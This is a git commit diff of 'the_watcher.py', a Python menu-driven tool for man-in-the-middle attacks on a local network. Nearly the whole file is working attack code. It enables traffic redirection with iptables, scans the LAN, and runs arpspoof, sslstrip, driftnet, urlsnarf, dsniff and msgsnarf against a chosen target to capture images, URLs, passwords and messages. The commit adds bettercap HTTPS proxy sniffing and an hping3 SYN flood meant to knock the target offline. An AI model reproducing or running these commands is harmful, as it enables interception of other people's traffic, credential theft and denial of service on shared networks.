6fe9d84ac8ba07b9fd98d7e9cf5c6182beed6aa0
Dev <devoohk2016@gmail.com>
2017-05-25 19:34:33 +0300

    NEW VERSION 3.0
    [1]Another great options has been added
    [2]Colors and animation modified
    [3]More flexible and faster
    [4]Bug fixes

--- the_watcher.py
+++ the_watcher.py
@@ -84,7 +84,7 @@ traffic_redirect2 = "sudo iptables -t nat -A PREROUTING -p udp --destination-por
 #arpspoof_interface = """"arpspoof -i """
 #arpspoof_target = " -t "
 #arpspoof_gateway = """ " """
-bash = "; bash"
+#bash = "; bash"
 clear = "clear"
 exit = "exit"
 
@@ -92,13 +92,16 @@ w = sleep(0.5)
 
 os.system("sudo apt install driftnet")
 os.system("sudo apt install sslstrip")
+os.system("sudo apt install bettercap")
+os.system("sudo apt install hping3")
 os.system ("clear")
+
 #Terms & Conditions>
 try:
 	os.system(clear)
 	import terms
 except ImportError:
-	print ("{0}[{1}x{0}]{2}Error:Some files is NOT FOUND!").format(WHITE , RED , RED)
+	print ("{0}[{1}x{0}]{2}Error:Some files are NOT FOUND!").format(WHITE , RED , RED)
 	sys.exit(0)	
 
 #banner starting../
@@ -106,7 +109,7 @@ try:
 	os.system(clear)
 	import banner
 except ImportError:
-	print ("{0}[{1}x{0}]{2}Error:Some files is NOT FOUND!").format(WHITE , RED , RED)
+	print ("{0}[{1}x{0}]{2}Error:Some files are  NOT FOUND!").format(WHITE , RED , RED)
 	sys.exit(0)
 
 
@@ -119,18 +122,19 @@ except IOError:
 except KeyboardInterrupt:
 	sys.exit("{}[x]Loading some tools has been interupted!\nHint:some tools need to installed first before continue using this tool!".format(FAIL))
 print
+
 #loading...
 print ("{}").format(Cafe)
 try:
-	toolbar_width = 40
+	toolbar_width = 14
 
 
-	sys.stdout.write("[%s]" % (" " * toolbar_width))
+	sys.stdout.write("|%s|" % (" " * toolbar_width))
 	sys.stdout.flush()
 	sys.stdout.write("\b" * (toolbar_width+1)) #after '['
 
 	for i in xrange(toolbar_width):
-    		time.sleep(0.1) # do real work here
+    		time.sleep(0.1)
     		sys.stdout.write("#") #GUI
     		sys.stdout.flush()
 
@@ -153,110 +157,158 @@ try:
 	"""
 	sleep(0.5)
 	#Redirecting Traffic to the client >>
-	print ("\n{0}Do you want to get network traffic now? ({1}y{0}/{2}n{0}) : ").format(OKGREEN , WHITE , RED)
-	print ("{}").format(BLUE)
-	traffic = raw_input("\nThe WATCHER > ")
-	
-	if traffic == "y" :
+	#print ("\n{0}Do you want to get network traffic now? ({1}y{0}/{2}n{0}) : ").format(OKGREEN , WHITE , RED)
+	#print ("{}").format(BLUE)
+	#traffic = raw_input("\nThe WATCHER > ")
+
+	if True:
 		
 		print ("\n{}Starting...").format(OKGREEN)
-		sleep(0.5)
+		sleep(0.2)
 		print ("\n{0}[{1}+{0}]{2}Redirecting traffic... ").format(WHITE , RED , Cafe)
-		sleep(1.2)
+		sleep(0.2)
 		#os.system(flush)
 		#os.system(flush_nat)
 		os.system (traffic_on)
 		
 		print ("\n{0}[{1}+{0}]{2}Directing traffic to port 8080 ... ").format(WHITE , RED , Cafe)
-		sleep(2.2)
+		sleep(0.2)
 		os.system (traffic_redirect)
 		#os.system (traffic_redirect2)
 		print ("\n{0}[{1}+{0}]{1}Done").format(WHITE , OKGREEN)
 		
-		sleep(0.5)
+		sleep(0.2)
 		
 		#Get the gateway ip >>
 		print ("\n{0}[{1}+{0}]{2}Getting gateway ip...").format(WHITE , RED , BLUE)
 
-		print(gateway_ip)
+		if gateway_ip == None:
+			print("\n{0}[x]Something wrong! make sure that you're connected to the internet".format(FAIL))
+			sys.exit(0)
+		else:
+			print(gateway_ip)
+			pass
 		
-		sleep (0.5)
-		print ("\n{0}[{1}*{0}]{2}Scanning targets in progress...").format(WHITE , RED , Cafe)
-		print
 		
-		#using python-nmap
-		nm = nmap.PortScanner()
-		nm.scan(hosts = gateway_ip+"/24", arguments='-sP')
-		hosts_list = [(x, nm[x]['status']['state']) for x in nm.all_hosts()]
-		for host, status in hosts_list:
-    			print('{3}{0} : {2}{1}'.format(host, status , OKGREEN , Cafe))
 		
+		sleep(0.2)
+		print("\n{0}Would you like to scan the local netwrok for targets? ({1}y {0}|{2} n{0})".format(OKGREEN , WHITE , FAIL))	
+		print ("{}").format(BLUE)
+		host_scaning = raw_input("\nThe WATCHER > ")
+		if host_scaning == "y":
+			sleep (0.2)
+			print ("\n{0}[{1}*{0}]{2}Scanning targets in progress...").format(WHITE , RED , Cafe)
+			print
+			#using python-nmap
+			nm = nmap.PortScanner()
+			nm.scan(hosts = gateway_ip+"/24", arguments='-sP')
+			hosts_list = [(x, nm[x]['status']['state']) for x in nm.all_hosts()]
+			for host, status in hosts_list:
+    				print('{3}{0} : {2}{1}'.format(host, status , OKGREEN , Cafe))
+		if host_scaning == "exit":
+			sys.exit("\n{}Thanks for stopping by :)".format(Cafe))
+		if host_scaning == "n":
+			pass
+		else:
+			pass
 		#scanning finshed!
-		sleep(0.5)
+		sleep(0.2)
 		print ("\n{}Enter your target ip : ").format(BLUE)
 		print ("{}").format(BLUE)
+		
 		target_ip = raw_input("\nThe WATCHER > ")
-
+		if target_ip == "exit":
+			sys.exit("\n{}Thanks for stopping by :)".format(Cafe))
 		#showing available interfaces
 		print"""\n{}Choose between these interfaces: 
 		""".format(Cafe)
-		sleep(0.5)
+		sleep(0.2)
 		interface_list = "sudo ifconfig -a | sed 's/[ \t].*//;/^\(lo\|\)$/d'"
 		os.system(interface_list)
 
 		print ("\n{}Enter your network interface : ").format(BLUE)
 		print ("{}").format(BLUE)
 		interface = raw_input("\nThe WATCHER > ")
+		if interface == "exit":
+			sys.exit("\n{}Thanks for stopping by :)".format(Cafe))
+				
+		 ##################################################
+		 #					  <     >					  #
+		 #												  #
+		 #				LAUNCHING THE ATTACKS!			  #
+		 #												  #
+		 ##################################################
 		
-		#######################################LAUNCH THE ATTACK!#######################################################################################
 		
-		sleep (1.0)
-		print ("\n{0}[{1}+{0}]{2}Arpspoofing Target! ...").format(WHITE , RED , Cafe) 
 		
-		arp = 'sudo xterm -geometry 65x19-0+0 -fg "#CE0808" -e arpspoof -i {0} -t {1} {2} &'.format(interface , target_ip , gateway_ip)
-		os.system (arp)
+		#options list
 		
-		sleep (2.0)
-		print ("\n{0}[{1}+{0}]{2}Arping in progress....").format(WHITE , RED , Cafe)
-		sleep (0.5)
-		print ("\n{}WARNING: Please don't close any poped up window!").format(RED)
-		
-		sleep (2.0)
-		print ("\n{0}[{1}+{0}]{2}Trying to Decrypt SSL Encryption!...").format(WHITE , RED , RED)
-		sleep(0.5)
-		sslstrip = 'sudo xterm -geometry 65x19-0-0 -fg "#0500FF" -e sslstrip -l 8080 &'
-		os.system (sslstrip)
-		
-		#
 		def choices ():
-			sleep(5.0)
+			sleep(1.0)
 			os.system(clear)
-			print """
-			    {0}<{1}Now choose between these options{0}>{1}:
-			""".format (RED , WHITE)
-			sleep (0.3)
-			print"""   {0}[{1}1{0}]{2} Sniff Images
-			""".format(YELLOW , RED , WHITE)			
-			sleep (0.3)
-			print"""   {0}[{1}2{0}]{2} Sniff Websites
-			""".format(YELLOW , RED , WHITE)
-			sleep (0.3)
-			print"""   {0}[{1}3{0}]{2} Sniff HTTP Passwords
-			""".format(YELLOW , RED , WHITE)
-			sleep (0.3)
-			print"""   {0}[{1}4{0}]{2} Sniff Low Encrypted Messages
-			""".format(YELLOW , RED , WHITE)
-			sleep (0.3)
-			print"""   {0}[{1}5{0}]{2} Sniff All
-			""".format(YELLOW , RED , WHITE)
-			sleep (0.3)
-			print """\n{}Press Ctrl+C to exit""".format(RED)
-			sleep (0.3)
+			print("		{0}<{1}Launching these attacks!{0}>{1}:\n".format (RED , WHITE))
+			
+			sleep (0.2)
+			print("{0}[ {1}1{0} ]{2} Arpspoof Target".format(YELLOW , RED , WHITE))
+			
+			sleep (0.2)
+			print("{0}[ {1}2{0} ]{2} SSL Stripe".format(YELLOW , RED , WHITE))
+
+			sleep (0.2)
+			print("{0}[ {1}3{0} ]{2} Sniff Images".format(YELLOW , RED , WHITE))
+			
+			sleep (0.2)
+			print("{0}[ {1}4{0} ]{2} Sniff Websites".format(YELLOW , RED , WHITE))
+			
+			sleep (0.2)
+			print("{0}[ {1}5{0} ]{2} Sniff HTTP/Low encrypted Passwords".format(YELLOW , RED , WHITE))
+			
+			sleep (0.2)
+			print("{0}[ {1}6{0} ]{2} Sniff Low Encrypted Messages".format(YELLOW , RED , WHITE))
+			
+			sleep (0.2)
+			print("{0}[ {1}7{0} ]{2} Get Http/Https requests {1}<Don't need to arpspoof or sslstrip>".format(YELLOW , RED , WHITE))
+
+			sleep (0.2)
+			print("{0}[ {1}8{0} ]{2} Sniff All".format(YELLOW , RED , WHITE))
+			
+			sleep (0.2)
+			print ("{0}[ {1}9{0} ]{2} Monitor all network traffic {1}<Don't need to arpspoof or sslstrip>".format(YELLOW , RED , WHITE))
+			
+			sleep (0.2)
+			print("{0}[ {1}10{0} ]{2} Cut the internet connection off the target".format(YELLOW , RED , WHITE))
+
+			sleep (0.2)
+			print ("{0}[ {1}0{0} ]{2} Exit".format(YELLOW , RED , WHITE))
+			
+			sleep (0.2)
 			print ("{}").format(BLUE)
 			client_choice = raw_input ("\nThe WATCHER > ")
+
+			if client_choice == "exit":
+				sys.exit("\n{}Thanks for stopping by :)".format(Cafe))
 			
 
 			if client_choice == "1":
+				sleep(1.0)
+				print ("\n{0}[{1}+{0}]{2}Arpspoofing Target! ...").format(WHITE , RED , Cafe)
+				arp = 'sudo xterm -geometry 65x19-0+0 -fg "#CE0808" -e arpspoof -i {0} -t {1} {2} &'.format(interface , target_ip , gateway_ip)
+				os.system (arp)
+				#os.system ("arpPID=$!")
+				return(choices())
+
+			if client_choice == "2":
+				sleep (1.0)
+				print ("\n{0}[{1}+{0}]{2}Trying to Decrypt SSL Encryption!...").format(WHITE , RED , RED)
+				sleep(0.5)
+				sslstrip = 'sudo xterm -geometry 65x19-0-0 -fg "#0500FF" -e sslstrip -l 8080 &'
+				os.system (sslstrip)
+				os.system ("sslstripPID=$!")
+				return(choices())
+
+
+
+			if client_choice == "3":
 				sleep (1.0)
 				print("\n{0}[{1}+{0}]{2}Sniffing Images").format(RED , WHITE , Cafe)
 				driftnet = 'sudo xterm -geometry 65x19+0+0 -fg "#FFB800" -e driftnet -i {0} &'.format(interface)
@@ -264,7 +316,7 @@ try:
 				os.system(driftnet)
 				return(choices())
 			
-			elif client_choice == "2":
+			elif client_choice == "4":
 				sleep (1.0)
 				print ("\n{0}[{1}+{0}]{2}Sniffing Websites").format(RED , WHITE , Cafe)
 				urlsnarf = 'sudo xterm -geometry 65x19+0-0 -fg "#33FF00" -e urlsnarf -i {} &'.format(interface)
@@ -273,15 +325,15 @@ try:
 				return(choices())
 		
 			
-			elif client_choice == "3":
+			elif client_choice == "5":
 				sleep (1.0)
-				print ("\n{0}[{1}+{0}]{2}Sniffing HTTP passwords...").format(RED , WHITE , Cafe)
+				print ("\n{0}[{1}+{0}]{2}Sniffing HTTP Low encrypted passwords...").format(RED , WHITE , Cafe)
 				dsniff = 'sudo xterm -geometry 65x19-0+0 -fg "#CE0808" -e dsniff -i {} &'.format(interface)
 				print
 				os.system(dsniff)
 				return(choices())
 
-			elif client_choice == "4":
+			elif client_choice == "6":
 				sleep (1.0)
 				print ("\n{0}[{1}+{0}]{2}Sniffing low encrypted messages...").format(RED , WHITE , Cafe)
 				msgsnarf = 'sudo xterm -geometry 65x19-0-0 -e msgsnarf -i {} &'.format(interface)
@@ -289,22 +341,73 @@ try:
 				os.system(msgsnarf)
 				return(choices())
 
-			elif client_choice == "5":
+			elif client_choice == "8":
 				sleep (1.0)
 				print ("\n{0}Warning{1}: {2}Many pop-ups will appear!").format(RED , WHITE , Cafe)
 				sleep (5.0)
+				
 				driftnet= 'sudo xterm -geometry 65x19+0+0 -fg "#FFB800" -e driftnet -i {0} &'.format(interface)
+				
 				urlsnarf= 'sudo xterm -geometry 65x19+0-0 -fg "#33FF00" -e urlsnarf -i {} &'.format(interface)
+				
 				dsniff= 'sudo xterm -geometry 65x19-0+0 -fg "#CE0808" -e dsniff -i {} &'.format(interface)
+				
 				msgsnarf= 'sudo xterm -geometry 65x19-0-0 -e msgsnarf -i {} &'.format(interface)
+				
+				print ("\n{0}[{1}+{0}]{2}Arpspoofing Target! ...").format(WHITE , RED , Cafe)
+				arp = 'sudo xterm -geometry 65x19-0+0 -fg "#CE0808" -e arpspoof -i {0} -t {1} {2} &'.format(interface , target_ip , gateway_ip)
+				os.system (arp)
+				sleep (3.0)
+				print ("\n{0}[{1}+{0}]{2}Trying to Decrypt SSL Encryption!...").format(WHITE , RED , RED)
+				sleep(0.5)
+				sslstrip = 'sudo xterm -geometry 65x19-0-0 -fg "#0500FF" -e sslstrip -l 8080 &'
+				os.system (sslstrip)
+				#os.system ("sslstripPID=$!")
+				sleep (3.0)
+				print("\n{0}[{1}+{0}]{2}Sniffing Images").format(RED , WHITE , Cafe)
 				os.system(driftnet)
-				sleep (4.0)
+				sleep (3.0)
+				print ("\n{0}[{1}+{0}]{2}Sniffing Websites").format(RED , WHITE , Cafe)
 				os.system(urlsnarf)
-				sleep (4.0)
+				sleep (3.0)
+				print ("\n{0}[{1}+{0}]{2}Sniffing HTTP Low encrypted passwords...").format(RED , WHITE , Cafe)
 				os.system(dsniff)
-				sleep (4.0)
+				sleep (3.0)
+				print ("\n{0}[{1}+{0}]{2}Sniffing low encrypted messages...").format(RED , WHITE , Cafe)
 				os.system(msgsnarf)
+				sleep (3.0)
 				return(choices())
+			
+			elif client_choice == "7":
+				sleep(1.0)
+				print("\n{0}[{1}+{0}]{2}Getting {0}HTTP{2}/{3}HTTPS {2}Requests".format(RED , WHITE , Cafe , GREEN))
+				#os.system("sudo kill $arpPID")
+				#os.system("sudo kill $sslstripPID")
+				bettercap_requests = 'sudo xterm -geometry 119x33-200-0 -e sudo bettercap -I {0} -G {1} -T {2} -X --proxy --proxy-https --sniffer-output captured-packets{2} &'.format(interface , gateway_ip , target_ip)
+				os.system(bettercap_requests)
+				return(choices())
+
+			elif client_choice == "9":
+				sleep(1.0)
+				print("\n{0}[{1}+{0}]{2}Monitoring ALL network traffic! {3}<AGGRESSIVE!>{2}".format(RED , WHITE , Cafe , GREEN))
+				#os.system("sudo kill $arpPID")
+				#os.system("sudo kill $sslstripPID")
+				bettercap_all = 'sudo xterm -geometry 119x33-200+0 -e sudo bettercap --proxy --proxy-https -P POST --sniffer-output captured-packets-all &'
+				os.system(bettercap_all)
+				return(choices())
+			
+			elif client_choice == "10":
+				sleep(1.0)
+				print("\n{0}[{1}+{0}]{2}Kick the target of network!".format(RED , WHITE , Cafe))
+				cut_internet = 'sudo xterm -geometry 65x19-300-250 -fg "#FF002E" -e sudo hping3 -c 10000 -d 128 -S --flood --rand-source {} &'.format(target_ip)
+				os.system(cut_internet)
+				return(choices())
+
+			elif client_choice == "0":
+				print ("\n{0}[{1}+{0}]{2}Friendly Exiting..".format(RED , WHITE , Cafe))
+				sleep (0.5)
+				print ("\n{}Thanks for stopping by :)".format(Cafe))
+				sys.exit(0)
 
 			else:
 				print ("\n{}Wrong Entry!!").format(RED)
@@ -312,9 +415,9 @@ try:
 
 		print(choices())
 
-	elif traffic == "n" :
-		print ("\n{0}See ya soon {1}:D").format(Cafe , WHITE)
-		print ("\n{0}[{1}x{0}]Exiting...").format(RED , WHITE)
+	#elif traffic == "n" :
+	#	print ("\n{0}See ya soon {1}:D").format(Cafe , WHITE)
+	#	print ("\n{0}[{1}x{0}]Exiting...").format(RED , WHITE)
 	else:
 		print ("\n{}[x]Wrong Entry").format(RED)
 		sys.exit(0)
